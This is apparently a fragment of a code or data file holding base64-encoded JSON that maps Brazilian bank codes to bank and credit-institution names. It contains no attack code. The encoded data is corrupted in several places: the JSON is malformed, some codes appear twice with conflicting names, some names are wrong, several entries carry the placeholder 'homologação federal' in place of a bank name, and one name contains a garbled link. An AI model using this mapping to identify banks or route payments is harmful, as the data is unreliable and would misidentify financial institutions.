wiLCIyNzQiOiJNb25leSBQbHVzIFNvY2llZGFkZSBEZSBDcmVkaXRvIGFvIE1pY3JvZW1wcmVlbmRlZG9yIGUgYSBFbXByZXNhIERlIFBlcXVlbm8gUG9ydCIsIjI3NiI6IlNlbmZmIFMuQS4gLSBDcmVkaXRvIiwiMjc4IjoiR2VuaWFsIEludmVzdGltZW50b3MgQ29ycmV0b3JhIERlIFZhbG9yZXMgTW9iaWxpw6FyaW9zIFMuQS4iLCIyNzkiOiJDb29wZXJhdGl2YSBEZSBDcmVkaXRvIFJ1cmFsIERlIFByaW1hdmVyYSBEbyBMZXN0ZSIsIjI4MCI6IkF2aXN0YSBTLkEuIENyw6lkaXRvIiwiMjgxIjoiQ29vcGF2ZWwiLCIyODMiOiJSYiBDYXBpdGFsIEludmVzdGltZW50b3MgRGlzdHJpYnVpZG9yYSBkZSBUw610dWxvcyBlIFZhbG9yZXMgTW9iaWxpw6FyaW9zIExpbWl0YWRhIiwiMjg1IjoiRnJlbnRlIENvcnJldG9yYSBEZSBDw6JtYmlvIEx0ZGEuIiwiMjg2IjoiQ29vcGVyYXRpdmEgRGUgQ3LDqWRpdG8gUnVyYWwgRGUgT3VybyBTdWxjcmVkaS9PdXJvIiwiMjg4IjoiQ2Fyb2wgRGlzdHJpYnVpZG9yYSBEZSBUaXR1bG9zIEUgVmFsb3JlcyBNb2JpbGlhcmlvcyBMdGRhLiIsIjI4OSI6IkRlY3lzZW8gQ29ycmV0b3JhIERlIENhbWJpbyBMdGRhLiIsIjI5MCI6IlBhZ3NlZ3VybyBJbnRlcm5ldCBTLkEuIiwiMjkyIjoiQnMyIERpc3RyaWJ1aWRvcmEgRGUgVMOtdHVsb3MgRSBWYWxvcmVzIE1vYmlsacOhcmlvcyBTLkEuIiwiMjkzIjoiTGFzdHJvIFJkdiBEaXN0cmlidWlkb3JhIERlIFTDrXR1bG8gRSBWYWxvcmVzIE1vYmlsacOhcmlvcyBMdGRhLiIsIjI5NiI6IlZpc2lvbiBTLkEuIENvcnJldG9yYSBEZSBDYW1iaW8iLCIyOTgiOiJWaXAncyBDb3JyZXRvcmEgZGUgQ8OibWJpbyBMdGRhLiIsIjI5OSI6IlNvcm9jcmVkIENyw6lkaXRvIiwiMzAwIjoiQmFuY28gRGUgTGEgTmFjaW9uIEFyZ2VudGluYSIsIjMwMSI6IkJQUCBJbnN0aXR1acOnw6NvIERlIFBhZ2FtZW50byBTLkEuIiwiMzA2IjoiUUkgU29jaWVkYWRlIGRlIENyw6lkaXRvIERpcmV0byBTLkEuIiwiMzA5IjoiQ2FtYmlvbmV0IENvcnJldG9yYSBEZSBDw6JtYmlvIEx0ZGEuIiwiMzEwIjoiVm9ydHggRGlzdHJpYnVpZG9yYSBkZSBUaXR1bG9zIGUgVmFsb3JlcyBNb2JpbGlhcmlvcyBMdGRhIiwiMzEzIjoiQW1hesO0bmlhIENvcnJldG9yYSBEZSBDw6JtYmlvIEx0ZGEuIiwiMzE1IjoiUGkgRGlzdHJpYnVpZG9yYSBkZSBUw610dWxvcyBlIFZhbG9yZXMgTW9iaWxpw6FyaW9zIFMuQS4iLCIzMTgiOiJCYW5jbyBCTUcgUy5BLiIsIjMxOSI6Ik9NIERpc3RyaWJ1aWRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsacOhcmlvcyBMdGRhIiwiMzIwIjoiQ2hpbmEgQ29uc3RydWN0aW9uIEJhbmsgKEJyYXNpbCkgQmFuY28gTcO6bHRpcGxvIFMuQS4iLCIzMjEiOiJDcmVmYXogU29jaWVkYWRlIERlIENyw6lkaXRvIEFvIE1pY3JvZW1wcmVlbmRlZG9yIEUgQSBFbXByZXNhIERlIFBlcXVlbm8gUG9ydGUgTHRkYSIsIjMyMiI6IkNvb3BlcmF0aXZhIERlIENyw6lkaXRvIFJ1cmFsIERlIEFiZWxhcmRvIEx1eiAtIFN1bGNyZWRpL0NyZWRpbHV6IiwiMzIzIjoiTWVyY2Fkb3BhZ28uQ29tIFJlcHJlc2VudGFjb2VzIEx0ZGEuIiwiMzI0IjoiQ2FydG9zIFNvY2llZGFkZSBEZSBDcsOpZGl0byBEaXJldG8gUy5BLiIsIjMyNSI6IsOTcmFtYSBEaXN0cmlidWlkb3JhIGRlIFTDrXR1bG8gRSBWYWxvcmVzIE1vYmlsacOhcmlvcyBTLkEuIiwiMzI2IjoiUGFyYXRpIC0gQ3JlZGl0byIsIjMyOSI6IlFpIFNvY2llZGFkZSBkZSBDcsOpZGl0byBEaXJldG8gUy5BLiIsIjMzMCI6IkJhbmNvIEJhcmkgRGUgSW52ZXN0aW1lbnRvcyBFIEZpbmFuY2lhbWVudG9zIFMuQS4iLCIzMzEiOiJGcmFtIENhcGl0YWwgRGlzdHJpYnVpZG9yYSBEZSBUw610dWxvcyBFIFZhbG9yZXMgTW9iaWxpw6FyaW9zIFMuQS4iLCIzMzIiOiJBY2Vzc28gU29sdcOnw7VlcyBEZSBQYWdhbWVudG8gUy5BLiIsIjMzNSI6IkJhbmNvIERpZ2lvIFMuQS4iLCIzMzYiOiJCYW5jbyBDNiBTLkEuIiwiMzQwIjoiU3VwZXIgUGFnYW1lbnRvcyBlIEFkbWluaXN0cmHDp8OjbyBkZSBNZWlvcyBFbGV0csO0bmljb3MgUy5BLiIsIjM0MSI6Ikl0YcO6IFVuaWJhbmNvIFMuQS4iLCIzNDIiOiJDcmVkaXRhcyBTb2NpZWRhZGUgRGUgQ3LDqWRpdG8gRGlyZXRvIFMuQS4iLCIzNDMiOiJGZmEgU29jaWVkYWRlIERlIENyw6lkaXRvIEFvIE1pY3JvZW1wcmVlbmRlZG9yIEUgXCBBIEVtcHJlc2EgRGUgUGVxdWVubyBQb3J0ZSBMdGRhLiIsIjM0OCI6IkJhbmNvIFhwIFMuQS4iLCIzNDkiOiJBbDUgUy5BLiBDcsOpZGl0byIsIjM1MiI6IlRvcm8gQ29ycmV0b3JhIERlIFTDrXR1bG8gRSBWYWxvcmVzIE1vYmlsacOhcmlvcyBMdGRhIiwiMzU0IjoiTmVjdG9uIEludmVzdGltZW50b3MgUy5BLiBDb3JyZXRvcmEgZGUgVmFsb3JlcyBNb2JpbGnDoXJpb3MgZSBDb21tb2RpdGllcyIsIjM1NSI6IsOTdGltbyBTb2NpZWRhZGUgRGUgQ3LDqWRpdG8gRGlyZXRvIFMuQS4iLCIzNTkiOiJaZW1hIENyw6lkaXRvIiwiMzYyIjoiQ2llbG8gUy5BLiIsIjM2MyI6IlNvY29wYSBTb2NpZWRhZGUgQ29ycmV0b3JhIFBhdWxpc3RhIFMuQS4iLCIzNjQiOiJHZXJlbmNpYW5ldCBTLkEuIiwiMzY1IjoiU29saWR1cyBTLkEuIENvcnJldG9yYSBkZSBDYW1iaW8gRSBWYWxvcmVzIE1vYmlsaWFyaW9zIiwiMzY2IjoiQmFuY28gU29jaWV0ZSBHZW5lcmFsZSBCcmFzaWwgUy5BLiIsIjM2NyI6IlZpdHJlbyBEaXN0cmlidWlkb3JhIGRlIFTDrXR1bG8gRSBWYWxvcmVzIE1vYmlsacOhcmlvcyBTLkEuIiwiMzY4IjoiQmFuY28gQ1NGIFMuQS4iLCIzNzAiOiJUZXJyYSBJbnZlc3RpbWVudG9zIERpc3RyaWJ1aWRvcmEgZGUgVMOtdHVsb3MgRSBWYWxvcmVzIE1vYmlsacOhcmlvcyBMdGRhLiIsIjM3MyI6IlVQLlAgU29jaWVkYWRlIGRlIEVtcHLDqXN0aW1vIEVudHJlIFBlc3NvYXMgUy5BLiIsIjM3NCI6IlJlYWxpemUgQ3LDqWRpdG8iLCIzNzYiOiJCYW5jbyBKLlAuIE1vcmdhbiBTLkEuIiwiMzc4IjoiQmJjIExlYXNpbmcgUy5BLiAtIEFycmVuZGFtZW50byBNZXJjYW50aWwiLCIzODAiOiJQaWNwYXkgU2Vydmljb3MgUy5BLiIsIjM4MSI6IkJhbmNvIE1lcmNlZGVzLUJlbnogRG8gQmFzaWwgUy5BLiIsIjM4NCI6Ikdsb2JhbCBGaW5hbmNhcyAtIFNvY2llZGFkZSBEZSBDcmVkaXRvIEFvIE1pY3JvZW1wcmVlbmRlZG9yIEUgXCBBIEVtcHJlc2EgRGUgUGVxdWVubyBQb3J0ZSBMdGRhLiIsIjM4NyI6IkJhbmNvIFRveW90YSBEbyBCcmFzaWwgUy5BLiIsIjM4OSI6IkJhbmNvIE1lcmNhbnRpbCBkbyBCcmFzaWwgUy5BLiIsIjM5MCI6IkJhbmNvIEdtIFMuQS4iLCIzOTEiOiJDb29wZXJhdGl2YSBEZSBDcmVkaXRvIFJ1cmFsIERlIEliaWFtIC0gU3VsY3JlZGkvSWJpYW0iLCIzOTMiOiJCYW5jbyBWb2xrc3dhZ2VuIFMuQS4iLCIzOTQiOiJCYW5jbyBCcmFkZXNjbyBGaW5hbmNpYW1lbnRvcyBTLkEuIiwiMzk2IjoiSHViIFBhZ2FtZW50b3MgUy5BIiwiMzk3IjoiTGlzdG8gU29jaWVkYWRlIERlIENyZWRpdG8gRGlyZXRvIFMuQS4iLCIzOTkiOiJLaXJ0b24gQmFuayBTLkEuIC0gQmFuY28gTcO6bHRpcGxvIiwiNDAzIjoiQ29yYSBTb2NpZWRhZGUgRGUgQ3LDqWRpdG8gRGlyZXRvIFMuQS4iLCI0MDQiOiJTdW11cCBTb2NpZWRhZGUgRGUgQ3LDqWRpdG8gRGlyZXRvIFMuQS4iLCI0MDgiOiJCw7NudXNjcmVkIFNvY2llZGFkZSBEZSBDcsOpZGl0byBEaXJldG8gUy5BLiIsIjQxMiI6IkJhbmNvIENhcGl0YWwgUy5BLiIsIjQyMiI6IkJhbmNvIFNhZnJhIFMuQS4iLCI0NTYiOiJCYW5jbyBNdWZnIEJyYXNpbCBTLkEuIiwiNDY0IjoiQmFuY28gU3VtaXRvbW8gTWl0c3VpIEJyYXNpbGVpcm8gUy5BLiIsIjQ3MyI6IkJhbmNvIENhaXhhIEdlcmFsIC0gQnJhc2lsIFMuQS4iLCI0NzciOiJDaXRpYmFuayBOLkEuIiwiNDc5IjoiQmFuY28gSXRhdWJhbmsgUy5BLiIsIjQ4NyI6IkRldXRzY2hlIEJhbmsgUy5BLiAtIEJhbmNvIEFsZW1hbyIsIjQ4OCI6IkpwbW9yZ2FuIENoYXNlIEJhbmsiLCI0OTIiOiJJbmcgQmFuayBOLlYuIiwiNDk1IjoiQmFuY28gRGUgTGEgUHJvdmluY2lhIERlIEJ1ZW5vcyBBaXJlcyIsIjUwNSI6IkJhbmNvIENyZWRpdCBTdWlzc2UgKEJyYXNpbCkgUy5BLiIsIjU0NSI6IlNlbnNvIENvcnJldG9yYSBEZSBDYW1iaW8gRSBWYWxvcmVzIE1vYmlsaWFyaW9zIFMuQSIsIjYwMCI6IkJhbmNvIEx1c28gQnJhc2lsZWlybyBTLkEuIiwiNjA0IjoiQmFuY28gSW5kdXN0cmlhbCBEbyBCcmFzaWwgUy5BLiIsIjYxMCI6IkJhbmNvIFZyIFMuQS4iLCI2MTEiOiJCYW5jbyBQYXVsaXN0YSBTLkEuIiwiNjEyIjoiQmFuY28gR3VhbmFiYXJhIFMuQS4iLCI2MTMiOiJPbW5pIEJhbmNvIFMuQS4iLCI2MjMiOiJCYW5jbyBQYW4gUy5BLiIsIjYyNiI6IkJhbmNvIEM2IENvbnNpZ25hZG8gUy5BLiIsIjYzMCI6IkJhbmNvIFNtYXJ0YmFuayBTLkEuIiwiNjMzIjoiQmFuY28gUmVuZGltZW50byBTLkEuIiwiNjM0IjoiQmFuY28gVHJpYW5ndWxvIFMuQS4iLCI2MzciOiJCYW5jbyBTb2Zpc2EgUy5BLiIsIjY0MyI6IkJhbmNvIFBpbmUgUy5BLiIsIjY1MiI6Ikl0YcO6IFVuaWJhbmNvIEhvbGRpbmcgUy5BLiIsIjY1MyI6IkJhbmNvIEluZHVzdmFsIFMuQS4iLCI2NTQiOiJCYW5jbyBEaWdpbWFpcyBTLkEuIiwiNjU1IjoiQmFuY28gVm90b3JhbnRpbSBTLkEuIiwiNzA3IjoiQmFuY28gRGF5Y292YWwgUy5BLiIsIjcxMiI6IkJhbmNvIE91cmludmVzdCBTLkEuIiwiNzM5IjoiQmFuY28gQ2V0ZWxlbSBTLkEuIiwiNzQxIjoiQmFuY28gUmliZWlyYW8gUHJldG8gUy5BLiIsIjc0MyI6IkJhbmNvIFNlbWVhciBTLkEuIiwiNzQ1IjoiQmFuY28gQ2l0aWJhbmsgUy5BLiIsIjc0NiI6IkJhbmNvIE1vZGFsIFMuQS4iLCI3NDciOiJCYW5jbyBSYWJvYmFuayBJbnRlcm5hdGlvbmFsIEJyYXNpbCBTLkEuIiwiNzQ4IjoiQmFuY28gQ29vcGVyYXRpdmEgU2ljcmVkaSBTLkEuIiwiNzUxIjoiU2NvdGlhYmFuayBCcmFzaWwgUy5BLiBCYW5jbyBNw7psdGlwbG8iLCI3NTIiOiJCYW5jbyBCbnAgUGFyaWJhcyBCcmFzaWwgUy5BLiIsIjc1MyI6Ik5vdm8gQmFuY28gQ29udGluZW50YWwgUy5BLiAtIEJhbmNvIE3Dumx0aXBsbyIsIjc1NCI6IkJhbmNvIFNpc3RlbWEgUy5BLiIsIjc1NSI6IkJhbmsgb2YgQW1lcmljYSBNZXJyaWxsIEx5bmNoIEJhbmNvIE3Dumx0aXBsbyBTLkEuIiwiNzU2IjoiQmFuY28gQ29vcGVyYXRpdm8gRG8gQnJhc2lsIFMuQS4gLSBCYW5jb29iIC0gU2ljb29iIiwiNzU3IjoiQmFuY28gS2ViIEhhbmEgRG8gQnJhc2lsIFMuQS4iLCIwODAiOiJCJlQgQ29ycmV0b3JhIERlIENhbWJpbyBMdGRhLiIsIjA3NSI6IkJhbmNvIEFibiBBbXJvIFMuQS4iLCIwMjUiOiJCYW5jbyBBbGZhIFMuQS4iLCIwNjUiOiJCYW5jbyBBbmRiYW5rIChCcmFzaWwpIFMuQS4iLCIwOTYiOiJCYW5jbyBCMyBTLkEuIiwiMDI0IjoiQmFuY28gQmFuZGVwZSBTLkEuIiwiMDYzIjoiQmFuY28gQnJhZGVzY2FyZCBTLkEuIiwiMDM2IjoiW0JhbmNvIEJyYWRlc2NvIEJCSSBTLkEufShodHRwczovL3dpc2UuY29t2JyL2NvZGlnby1kby1iYW5jby9icmFkZXNjby1iYmkpIiwiMDQwIjoiQmFuY28gQ2FyZ2lsbCBTLkEuIiwiMDY5IjoiQmFuY28gQ3JlZmlzYSBTLkEuIiwiMDAzIjoiQmFuY28gZGEgQW1hem9uaWEgUy5BLiIsIjA4MyI6IkJhbmNvIGRhIENoaW5hIEJyYXNpbCBTLkEuIiwiMDAxIjoiQmFuY28gZG8gQnJhc2lsIFMuQS4iLCIwNDciOiJCYW5jbyBEbyBFc3RhZG8gRGUgU2VyZ2lwZSBTLkEuIiwiMDM3IjoiQmFuY28gRG8gRXN0YWRvIERvIFBhcsOhIFMuQS4iLCIwNDEiOiJCYW5jbyBEbyBFc3RhZG8gRG8gUmlvIEdyYW5kZSBEbyBTdWwgUy5BLiIsIjAwNCI6IkJhbmNvIERvIE5vcmRlc3RlIERvIEJyYXNpbCBTLkEuIiwiMDk0IjoiQmFuY28gRmluYXhpcyBTLkEuIiwiMDEyIjoiQmFuY28gSW5idXJzYSBTLkEuIiwiMDc3IjoiQmFuY28gSW50ZXIgUy5BLiIsIjAyOSI6IkJhbmNvIEl0YcO6IENvbnNpZ25hZG8gUy5BLiIsIjA3NCI6IkJhbmNvIEouIFNhZnJhIFMuQS4iLCIwNzYiOiJCYW5jbyBLZGIgRG8gQnJhc2lsIFMuQS4iLCIwNjYiOiJCYW5jbyBNb3JnYW4gU3RhbmxleSBTLkEuIiwiMDA3IjoiQmFuY28gTmFjaW9uYWwgRGUgRGVzZW52b2x2aW1lbnRvIEVjb25vbWljbyBFIFNvY2lhbCIsIjA3OSI6IkJhbmNvIE9yaWdpbmFsIERvIEFncm9uZWfDs2NpbyBTLkEuIiwiMDg4IjoiQmFuY28gUmFuZG9uIFMuQS4iLCIwMzMiOiJCYW5jbyBTYW50YW5kZXIgKEJyYXNpbCkgUy5BLiIsIjA4MiI6IkJhbmNvIFRvcMOhemlvIFMuQS4iLCIwMTgiOiJCYW5jbyBUcmljdXJ5IFMuQS4iLCIwODEiOiJCYW5jb3NlZ3VybyBTLkEuIiwiMDIxIjoiQmFuZXN0ZXMgUy5BLiBCYW5jbyBEbyBFc3RhZG8gZG8gRXNwaXJpdG8gU2FudG8iLCIwMTclOiJCbnkgTWVsbG9uIEJhbmNvIFMuQS4iLCIwNzAiOiJCckIgLSBCYW5jbyBEZSBCcmFzaWxpYSBTLkEuIiwiMDkyIjoiQnJrIFMuQS4gQ3LDqWRpdG8iLCIwOTEiOiJDZW50cmFsIERlIENvb3BlcmF0aXZhcyBEZSBFY29ub21pYSBFIENyw6lkaXRvIE3DunR1byBEbyBFc3RhZG8gRG8gUmlvIEdyYW5kZSBEbyBTIiwiMDYwIjoiQ29uZmlkZW5jZSBDb3JyZXRvcmEgRGUgQ8OibWJpbyBTLkEuIiwiMDg1IjoiQ29vcGVyYXRpdmEgQ2VudHJhbCBEZSBDcsOpZGl0byAtIEFpbG9zIiwiMDk4IjoiQ3JlZGlhbGlhbsOnYSBDb29wZXJhdGl2YSBEZSBDcsOpZGl0byBSdXJhbCIsIjAxMCI6IkNyZWRpY29hbW8gQ3JlZGl0byBSdXJhbCBDb29wZXJhdGl2YSIsIjA4OSI6IkNyZWRpc2FuIENvb3BlcmF0aXZhIERlIENyw6lkaXRvIiwiMDk3IjoiQ3JlZGlzaXMgLSBDZW50cmFsIERlIENvb3BlcmF0aXZhcyBEZSBDcsOpZGl0byBMdGRhLiIsIjAxMCI6IkNyZWRpdCBTdWlzc2UgSGVkZ2luZy1HcmlmZm8gQ29ycmV0b3JhIERlIFZhbG9yZXMgUy5BIiwiMDY0IjoiR29sZG1hbiBTYWNocyBEbyBCcmFzaWwgQmFuY28gTXVsdGlwbG8gUy5BLiIsIjA3OCI6IkhhaXRvbmcgQmFuY28gRGUgSW52ZXN0aW1lbnRvIERvIEJyYXNpbCBTLkEuIiwiMDYyIjoiSGlwZXJjYXJkIEJhbmNvIE3Dumx0aXBsbyBTLkEuIiwiMDE0IjoiU3RhdGUgU3RyZWV0IEJyYXNpbCBTLkEuIC0gQmFuY28gQ29tZXJjaWFsIiwiMDk1IjoiVHJhdmVsZXggQmFuY28gRGUgQ8OibWJpbyBTLkEuIiwiMDE1IjoiVWJzIEJyYXNpbCBDb3JyZXRvcmEgZGUgQ8OibWJpbywgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsacOhcmlvcyBTLkEuIiwiMDk5IjoiVW5pcHJpbWUgQ2VudHJhbCAtIENlbnRyYWwgSW50ZXJlc3RhZHVhbCBEZSBDb29wZXJhdGl2YXMgZGUgQ3JlZGl0byBMdGRhLiIsIjA4NCI6IlVuaXByaW1lIE5vcnRlIERvIFBhcmFuw6EgLSBDb29wIGRlIEVjb25vbWlhIGUgQ3LDqWRpdG8gTcO6dHVvIERvcyBNw6lkaWNvcyJ9In0="));"eyIwMDEiOiJCYW5jbyBkbyBCcmFzaWwiLCIwMDMiOiJCYW5jbyBkYSBBbWF6w7RuaWEiLCIwMDQiOiJCYW5jbyBkbyBOb3JkZXN0ZSIsIjAwNyI6IkJOREVTIiwiMDEwIjpDb29wZXJhdGl2YSBEZSBDcmVkaXRvIFJ1cmFsIERlIEliaWFtIC0gU3VsY3JlZGkvSWJpYW0iLCIwMTEiOiJDcmVkaXQgU3Vpc3NlIEhHIiwiMDEyIjoiQmFuY28gSW5idXJzYSIsIjAxNyI6IkJueSBNZWxsb24iLCIwMjEiOiJCYW5lc3RlcyIsIjAyNCI6IkJhbmNvIEJhbmRlcGUiLCIwMjUiOiJCYW5jbyBBbGZhIiwiMDI5IjoiSXRhw7ogQ29uc2lnbmFkbyIsIjAzMyI6IlNhbnRhbmRlciIsIjAzNiI6IkJyYWRlc2NvIEJCSSIsIjAzNyI6IkJhbnBhcsOhIiwiMDQxIjoiQmFucmlzdWwiLCIwNDciOiJCYW5jbyBCYW5lc2UiLCIwNjAiOiJDb25maWRlbmNlIENvcnJldG9yYSIsIjA2MiI6IkhpcGVyY2FyZCIsIjA2MyI6IkJyYWRlc2NhcmQiLCIwNjQiOiJHb2xkbWFuIFNhY2hzIiwiMDY1IjoiQmFuY28gQW5kYmFuayIsIjA2NiI6Ik1vcmdhbiBTdGFubGV5IiwiMDY5IjoiQ3JlZmlzYSIsIjA3MCI6IkJSQiAtIEJhbmNvIGRlIEJyYXPDrWxpYSIsIjA3NCI6IkJhbmNvIEouIFNhZnJhIFMuQS4iLCIwNzUiOiJCYW5jbyBBQk4gQU1STyIsIjA3NiI6IkJhbmNvIEtEQiIsIjA3NyI6IkJhbmNvIEludGVyIiwiMDc4IjoiaGFpdG9uZyBCYW5jbyIsIjA3OSI6IkJhbmNvIE9yaWdpbmFsIEFncm8iLCIwODAiOiJCJlQgQ29ycmV0b3JhIiwiMDgxIjoiQmFuY29zZWd1cm8iLCIwODIiOiJCYW5jbyBUb3DDoXppbyIsIjA4MyI6IkJhbmNvIGRhIENoaW5hIEJyYXNpbCIsIjA4NCI6IlVuaXByaW1lIE5vcnRlIFBSIiwiMDg1IjoiQWlsb3MiLCIwODgiOiJCYW5jbyBSYW5kb24iLCIwODkiOiJDcmVkaXNhbiIsIjA5MSI6IkNlbnRyYWwgUlMiLCIwOTIiOiJCUksgUy5BLiBDcsOpZGl0byIsIjA5NCI6IkJhbmNvIEZpbmF4aXMiLCIwOTYiOiJCYW5jbyBCMyIsIjA5NyI6IkNyZWRpc2lzIiwiMDk4IjoiQ3JlZGlhbGlhbsOnYSIsIjA5OSI6IlVuaXByaW1lIENlbnRyYWwiLCIxMDAiOiJQbGFubmVyIENvcnJldG9yYSIsIjEwMSI6IlJlbmFzY2Vuw6dhIERUVk0iLCIxMDIiOiJYUCBJbnZlc3RpbWVudG9zIiwiMTA0IjoiQ2FpeGEgRWNvbsO0bWljYSBGZWRlcmFsIiwiMTA1IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiMTA3IjoiQmFuY28gQm9jb20gQkJNIiwiMTA4IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiMTExIjoiT2xpdmVpcmEgVHJ1c3QiLCIxMTMiOiJNYWdsaWFubyBTLkEuIiwiMTE0IjoiQ2Vjb29wIiwiMTE3IjoiQWR2YW5jZWQgQ29ycmV0b3JhIiwiMTE5IjoiV2VzdGVybiBVbmlvbiIsIjEyMCI6IkJhbmNvIFJvZG9iZW5zIiwiMTIxIjoiQmFuY28gQWdpYmFuayIsIjEyMiI6IkJyYWRlc2NvIEJlcmoiLCIxMjQiOiJXb29yaSBCYW5rIiwiMTI1IjoiUGx1cmFsIFMuQS4iLCIxMjYiOiJCUiBQYXJ0bmVycyIsIjEyNyI6IkNvZGVwZSBDb3JyZXRvcmEiLCIxMjgiOiJNUyBCYW5rIiwiMTI5IjoiVUJTIEJyYXNpbCIsIjEzMCI6IkNhcnVhbmEgUy5BLiIsIjEzMSI6IlR1bGxldHQgUHJlYm9uIiwiMTMyIjoiSUNCQyBkbyBCcmFzaWwiLCIxMzMiOiJDcmVzb2wiLCIxMzQiOiJCR0MgTGlxdWlkZXoiLCIxMzYiOiJVbmljcmVkIGRvIEJyYXNpbCIsIjEzOCI6IkdldCBNb25leSBDb3JyZXRvcmEiLCIxMzkiOiJJbnRlc2EgU2FucGFvbG8iLCIxNDAiOiJFYXN5bnZlc3QiLCIxNDIiOiJCcm9rZXIgQnJhc2lsIENvcnJldG9yYSIsIjE0MyI6IlRyZXZpc28gQ29ycmV0b3JhIiwiMTQ0IjoiQmV4cyBCYW5jbyIsIjE0NSI6IkxldnljYW0iLCIxNDYiOiJHdWl0dGEgQ29ycmV0b3JhIiwiMTQ5IjoiRmFjdGEgRmluYW5jZWlyYSIsIjE1NyI6IklDQVAgZG8gQmFzaWwiLCIxNTkiOiJDYXNhIGRvIENyw6lkaXRvIiwiMTYzIjoiQ29tbWVyemJhbmsgQnJhc2lsIiwiMTY5IjoiQmFuY28gT2zDqSBDb25zaWduYWRvIiwiMTczIjoiQlJMIFRydXN0IiwiMTc0IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiMTc3IjoiR3VpZGUgSW52ZXN0aW1lbnRvcyIsIjE4MCI6IkNNIENhcGl0YWwgTWFya2V0cyIsIjE4MyI6IlNvY3JlZCBTLkEuIiwiMTg0IjoiQmFuY28gSXRhw7ogQkJBIiwiMTg4IjoiQXRpdmEgSW52ZXN0aW1lbnRvcyIsIjE4OSI6IkhTIEZpbmFuY2VpcmEiLCIxODkiOiJDb29wZXJhdGl2YSBEZSBDcmVkaXRvIFJ1cmFsIERlIEliaWFtIC0gU3VsY3JlZGkvSWJpYW0iLCIxOTEiOiJOb3ZhIEZ1dHVyYSIsIjE5NCI6IlBhcm1ldGFsIERUVk0iLCIxOTYiOiJGYWlyIENvcnJldG9yYSIsIjE5NyI6IlN0b25lIFBhZ2FtZW50b3MiLCIyMDgiOiJCYW5jbyBCVEcgUGFjdHVhbCIsIjIxMiI6IkJhbmNvIE9yaWdpbmFsIiwiMjEzIjoiQmFuY28gQXJiaSIsIjIxNyI6IkJhbmNvIEpvaG4gRGVlcmUiLCIyMTgiOiJCYW5jbyBCUzIiLCIyMjIiOiJDcsOpZGl0IEFncmljb2xlIiwiMjI0IjoiQmFuY28gRmlicmEiLCIyMzMiOiJCYW5jbyBDZXRlbGVtIiwiMjM3IjoiQmFuY28gQnJhZGVzY28iLCIyNDEiOiJCYW5jbyBDbMOhc3NpY28iLCIyNDMiOiJCYW5jbyBNw6F4aW1hIiwiMjQ2IjoiQmFuY28gQUJDIEJyYXNpbCIsIjI0OSI6IkludmVzdGNyZWQgVW5pYmFuY28iLCIyNTAiOiJCQ1YgLSBDcsOpZGl0byBlIFZhcmVqbyIsIjI1MyI6IkJleHMgQ29ycmV0b3JhIiwiMjU0IjoiUGFyYW7DoSBCYW5jbyIsIjI1OSI6Ik1vbmV5Y29ycCBCYW5jbyIsIjI2MCI6Ik51YmFuayIsIjI2NSI6IkJhbmNvIEZhdG9yIiwiMjY2IjoiQmFuY28gQ8OpZHVsYSIsIjI2OCI6IkJhcmkgQ2lhIEhpcG90ZWPDoXJpYSIsIjI2OSI6IkJhbmNvIEhTQkMiLCIyNzEiOiJJQiBDb3JyZXRvcmEiLCIyNzIiOiJBR0sgQ29ycmV0b3JhIiwiMjc0IjoiTW9uZXkgUGx1cyIsIjI3OCI6IkdlbmlhbCBJbnZlc3RpbWVudG9zIiwiMjgwIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiMjgxIjoiQ29vcGF2ZWwiLCIyODUiOiJGcmVudGUgQ29ycmV0b3JhIiwiMjg2IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiMjg4IjoiQ2Fyb2wgRFRVTSIsIjI4OSI6IkRlY3lzZW8gQ29ycmV0b3JhIiwiMjkwIjoiUGFnQmFuayIsIjI5MiI6IkJTMiBEVFZNIiwiMjkzIjoiTGFzdHJvIFJEViIsIjI5OSI6IlNvcm9jcmVkIiwiMzAwIjoiQmFuY28gZGUgbGEgTmFjaW9uIEFyZ2VudGluYSIsIjMwMSI6IkJQUCBQYWdhbWVudG9zIiwiMzA2IjoiUUkgU29jaWVkYWRlIGRlIENyw6lkaXRvIiwiMzA5IjoiQ2FtYmlvbmV0IENvcnJldG9yYSIsIjMxMyI6IkFtYXrDtG5pYSBDb3JyZXRvcmEiLCIzMTUiOiJQaSBEVFZNIiwiMzE4IjoiQmFuY28gQk1HIiwiMzE5IjoiT00gRFRVTSIsIjMyMCI6IkNoaW5hIENvbnN0cnVjdGlvbiBCYW5rIiwiMzIxIjoiQ3JlZmF6IiwiMzIzIjoiTWVyY2FkbyBQYWdvIiwiMzI0IjoiQ2FydG9zIFNDRCIsIjMyNSI6IsOTcmFtYSBEVFZNIiwiMzI2IjoiUGFyYXRpIC0gQ3JlZGl0byIsIjMzMCI6IkJhbmNvIEJhcmkiLCIzMzEiOiJGcmFtIENhcGl0YWwiLCIzMzIiOiJBY2Vzc28gU29sdcOnw7VlcyIsIjMzNSI6IkJhbmNvIERpZ2lvIiwiMzM2IjoiQmFuY28gQzYiLCIzNDAiOiJTdXBlciBQYWdhbWVudG9zIiwiMzQxIjoiSXRhw7ogVW5pYmFuY28iLCIzNDIiOiJDcmVkaXRhcyBTQ0QiLCIzNDgiOiJCYW5jbyBYUCIsIjM0OSI6IkFMNSBTLkEuIENyw6lkaXRvIiwiMzY0IjoiR2VyZW5jaWFuZXQgKEVmw60pIiwiMzY2IjoiU29jacOpdMOpIEfDqW7DqXJhbGUiLCIzNjgiOiJCYW5jbyBDU0YgKENhcnJlZm91cikiLCIzNzAiOiJUZXJyYSBJbnZlc3RpbWVudG9zIiwiMzc2IjoiSi5QLiBNb3JnYW4iLCIzODAiOiJQaWNQYXkiLCIzODEiOiJNZXJjZWRlcy1CZW56IiwiMzg5IjoiQmFuY28gTWVyY2FudGlsIiwiMzkwIjoiQmFuY28gR00iLCIzOTMiOiJWb2xrc3dhZ2VuIiwiMzk0IjoiQmJyYWRlc2NvIEZpbmFuY2lhbWVudG9zIiwiMzk2IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiMzk5IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNDAzIjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNDA0IjoiaG9tb2xvZ2HDp8OjbyBmZWRlcmFsIiwiNDA4IjoiaG9tb2xvZ2HDp8